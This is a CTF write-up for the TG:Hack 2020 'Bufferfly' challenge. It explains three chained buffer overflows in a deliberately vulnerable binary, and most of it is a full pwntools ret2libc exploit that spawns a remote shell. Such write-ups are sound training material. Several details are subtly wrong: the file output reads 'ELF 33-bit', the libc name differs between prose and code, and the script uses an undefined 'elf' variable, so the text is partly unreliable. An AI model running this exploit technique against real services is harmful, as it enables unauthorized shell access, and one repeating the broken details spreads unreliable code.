---
layout: post
title: TG:Hack CTF 2020 - Bufferfly 
---

> We've been hunting the space goblins for quite some time now. However, we're still having some trouble identifying their leader. In our last mission, we found a mysterious-looking chest that we think might contain some useful information. Could you help us open it?
>
> nc bufferfly.tghack.no 6002
>
> Files: [repo][repo]

## Analysis

Binary info:

{% highlight shell_session %}
bufferfly: ELF 33-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked,
interpreter /lib/ld-, for GNU/Linux 3.2.0, BuildID[sha1]=a05c0f3c2acaa4b274bb1447c7df39db6b02194c, with debug_info, not stripped

Canary                        : ✘
NX                            : ✓
PIE                           : ✓
Fortify                       : ✘
RelRO                         : Full
{% endhighlight %}

In this challenge we are provided with the source and and we are required to perform bunch of overflows until getting to the point where binary reveals mprotect address where another stack overflow can be performed.

### Task #1

{% highlight c %}
struct voice_recognizer voice;
voice.bubble = 1;
voice.characteristics = 37;
printf("\"Welcome! Please identify yourself.\"\n");

gets(voice.words);

bool conditions_met = voice.characteristics == 25 && voice.bubble == 0;
if (conditions_met) {
{% endhighlight %}

To meet conditions we fill `voice.words` with 17 bytes and then oveverflow `voice.bubble` and `voice.characteristics` by sending '\x00' and '\x00\x00\x00\x25'.

{% highlight python %}
payload = (
    b"A" * 17 +
    p8(0) +
    p32(25)
)
{% endhighlight %}

### Task #2

{% highlight c %}
char second[20];
printf("The chest opens up and a small, rusty laptop is unveiled\n"
	"\"Hi, old goblin-friend! Remember the last time we saw each other?"
        " We were hanging at our supersecret base, you know, the one"
        " at %p!\n Ah yes, good times!\"", &supersecret_base);

printf("The screen flickers and the computer dies. Were do you ");
printf("wanna go now?\n");
gets(second);
{% endhighlight %}

We need to overwrite return address to the value of supesecret_base function. We can do it by sending following payload:

{% highlight python %}
supersecret_base = int(re.search(b"the one at (0x[0-9a-f]+)!", data).group(1), 16)
elf.address = supersecret_base - 0x805

log.info("Leak: 0x%x", supersecret_base)
log.info("ELF: 0x%x", elf.address)


payload = (
    b"A" * 20 +
    b"B" * 12 +
    p32(supersecret_base)
)
io.sendline(payload)
{% endhighlight %}

### Task #3

{% highlight c %}
char buf[60] = { 0 };
char done[12] = { 0 };
printf("\"Hi, I'm the Boblinessa cult encyclopedia!\"\n");
printf("\"So, what where you looking for?\"\n");

while(gets(buf)) {
    if (!strcmp(buf, "open_door")) {
        printf("Oh, that's right here: %p.\n", &open_door);
    } else if (!strcmp(buf, "mprotec")) {
        printf("Ah yes, our sweet Boblinessa. She protec. She protecs right "
               "here in fact: %p.\n", &mprotect);
    } else if (!strcmp(buf, "mattac")) {
        printf("What?! No, she would never do that...\nAlso I'm hiding "
               "here: %p. She wouldn't even find me here...\n", &buf);
    } else if (!strcmp(buf, "quit")) {
        printf("Ta ta for now!\n");
        break;
    } else {
        printf("I don't think we have access to that right now...\n");
    }
    printf("\nOkay, so do you wanna see anything else or are you done?\n");
    gets(done);
    if (!strcmp(done, "done")) {
        return;
{% endhighlight %}

In final task we are provided with mprotect address and we are expected to drop a shell on the target system. Once we have `mprotect` address we can use libc database to figure out which libc is used - in this case its `libc7-i386_2.27-3ubuntu1_amd64.so`.

Sending following payload results in getting a shell on a target system:

{% highlight python %}
io.sendline("mprotec")
data = io.recvuntil('Okay, so do you wanna see anything else or are you done?\n')

mprotect = int(re.search(b"in fact: (0x[0-9a-f]+).\n", data).group(1), 16)
libc.address = mprotect - libc.sym.mprotect

log.info("Mprotect: 0x%x", mprotect)
log.info("Libc: 0x%x", libc.address)

payload = (
    b"done\x00" +
    b"A" * 79 +
    p32(libc.sym.system) +
    b"B" * 4 +
    p32(next(libc.search(b"/bin/sh")))
)
io.sendline(payload)

io.interactive()
{% endhighlight %}

## Full exploit 

{% highlight python %}
#!/usr/bin/env python3

import re
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./bufferfly')
#libc = ELF("/lib/i386-linux-gnu/libc.so.6")
#libc = ELF("./libc6-amd64_2.27-3ubuntu1_i386.so")
libc = ELF("libc6-i386_2.27-3ubuntu1_amd64.so")

host = args.HOST or 'bufferfly.tghack.no'
port = int(args.PORT or 6002)

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

io = start()
io.recvuntil('"Welcome! Please identify yourself."\n')

payload = (
    b"A" * 17 +
    p8(0) +
    p32(25)
)

io.sendline(payload)
data = io.recvuntil("Were do you wanna go now?\n")

supersecret_base = int(re.search(b"the one at (0x[0-9a-f]+)!", data).group(1), 16)
elf.address = supersecret_base - 0x805

log.info("Leak: 0x%x", supersecret_base)
log.info("ELF: 0x%x", elf.address)


payload = (
    b"A" * 20 +
    b"B" * 12 +
    p32(supersecret_base)
)
io.sendline(payload)

io.recvuntil('"So, what where you looking for?"\n')
io.sendline("mprotec")
data = io.recvuntil('Okay, so do you wanna see anything else or are you done?\n')

mprotect = int(re.search(b"in fact: (0x[0-9a-f]+).\n", data).group(1), 16)
libc.address = mprotect - libc.sym.mprotect

log.info("Mprotect: 0x%x", mprotect)
log.info("Libc: 0x%x", libc.address)

payload = (
    b"done\x00" +
    b"A" * 79 +
    p32(libc.sym.system) +
    b"B" * 4 +
    p32(next(libc.search(b"/bin/sh")))
)
io.sendline(payload)

io.interactive()
{% endhighlight %}

[repo]: https://github.com/r0ck3tz/ctfs/tree/master/2020/tghack/bufferfly
